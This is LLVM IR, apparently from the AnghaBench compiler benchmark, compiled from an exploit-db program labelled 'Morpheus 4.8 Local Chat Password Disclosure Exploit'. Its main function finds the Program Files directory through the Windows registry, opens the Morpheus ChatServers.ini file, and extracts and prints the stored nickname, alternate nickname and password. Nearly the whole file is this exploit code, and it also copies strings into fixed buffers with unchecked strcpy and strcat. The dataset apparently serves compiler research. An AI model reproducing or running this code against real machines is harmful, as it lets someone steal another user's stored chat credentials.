; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_935.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_935.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HKEY_LOCAL_MACHINE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [42 x i8] c"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\00", align 1
@KEY_QUERY_VALUE = common dso_local global i32 0, align 4
@hKey = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [16 x i8] c"ProgramFilesDir\00", align 1
@prgfiles = common dso_local global i64 0, align 8
@dwBufLen = common dso_local global i64 0, align 8
@lRet = common dso_local global i64 0, align 8
@BUFSIZE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [19 x i8] c"An error occured!\0A\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"\\StreamCast\\Morpheus\\ChatServers.ini\00", align 1
@.str.4 = private unnamed_addr constant [62 x i8] c"Morpheus 4.8 Local Chat Password Disclosure Exploit by Kozan\0A\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"Credits to ATmaCA\0A\00", align 1
@.str.6 = private unnamed_addr constant [47 x i8] c"www.netmagister.com - www.spyinstructors.com \0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"kozan@netmagister.com \0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"Nick=\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"AltNick=\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"Pwd=\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"Nickname : %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c"Altnick : %s\0A\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"Password : %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @HKEY_LOCAL_MACHINE, align 4
  %7 = load i32, i32* @KEY_QUERY_VALUE, align 4
  %8 = call i64 @RegOpenKeyEx(i32 %6, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0), i32 0, i32 %7, i32* @hKey)
  %9 = load i64, i64* @ERROR_SUCCESS, align 8
  %10 = icmp eq i64 %8, %9
  br i1 %10, label %11, label %31

11:                                               ; preds = %0
  %12 = load i32, i32* @hKey, align 4
  %13 = load i64, i64* @prgfiles, align 8
  %14 = trunc i64 %13 to i32
  %15 = call i64 @RegQueryValueEx(i32 %12, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i32* null, i32* null, i32 %14, i64* @dwBufLen)
  store i64 %15, i64* @lRet, align 8
  %16 = load i64, i64* @lRet, align 8
  %17 = load i64, i64* @ERROR_SUCCESS, align 8
  %18 = icmp ne i64 %16, %17
  br i1 %18, label %23, label %19

19:                                               ; preds = %11
  %20 = load i64, i64* @dwBufLen, align 8
  %21 = load i64, i64* @BUFSIZE, align 8
  %22 = icmp sgt i64 %20, %21
  br i1 %22, label %23, label %28

23:                                               ; preds = %19, %11
  %24 = load i32, i32* @hKey, align 4
  %25 = call i32 @RegCloseKey(i32 %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %27 = call i32 @exit(i32 1) #4
  unreachable

28:                                               ; preds = %19
  %29 = load i32, i32* @hKey, align 4
  %30 = call i32 @RegCloseKey(i32 %29)
  br label %36

31:                                               ; preds = %0
  %32 = load i32, i32* @hKey, align 4
  %33 = call i32 @RegCloseKey(i32 %32)
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %35 = call i32 @exit(i32 1) #4
  unreachable

36:                                               ; preds = %28
  %37 = load i64, i64* @prgfiles, align 8
  %38 = call i32 @strcat(i64 %37, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.4, i64 0, i64 0))
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.6, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %43 = load i64, i64* @BUFSIZE, align 8
  %44 = call i8* @llvm.stacksave()
  store i8* %44, i8** %2, align 8
  %45 = alloca i8, i64 %43, align 16
  store i64 %43, i64* %3, align 8
  %46 = load i64, i64* @BUFSIZE, align 8
  %47 = alloca i8, i64 %46, align 16
  store i64 %46, i64* %4, align 8
  %48 = load i64, i64* @BUFSIZE, align 8
  %49 = alloca i8, i64 %48, align 16
  store i64 %48, i64* %5, align 8
  %50 = load i64, i64* @prgfiles, align 8
  %51 = call i32 @oku(i64 %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0))
  %52 = call i32 @strcpy(i8* %45, i32 %51)
  %53 = load i64, i64* @prgfiles, align 8
  %54 = call i32 @oku(i64 %53, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0))
  %55 = call i32 @strcpy(i8* %47, i32 %54)
  %56 = load i64, i64* @prgfiles, align 8
  %57 = call i32 @oku(i64 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %58 = call i32 @strcpy(i8* %49, i32 %57)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0), i8* %45)
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0), i8* %47)
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %49)
  store i32 0, i32* %1, align 4
  %62 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %62)
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

declare dso_local i64 @RegOpenKeyEx(i32, i8*, i32, i32, i32*) #1

declare dso_local i64 @RegQueryValueEx(i32, i8*, i32*, i32*, i32, i64*) #1

declare dso_local i32 @RegCloseKey(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcat(i64, i8*) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local i32 @strcpy(i8*, i32) #1

declare dso_local i32 @oku(i64, i8*) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
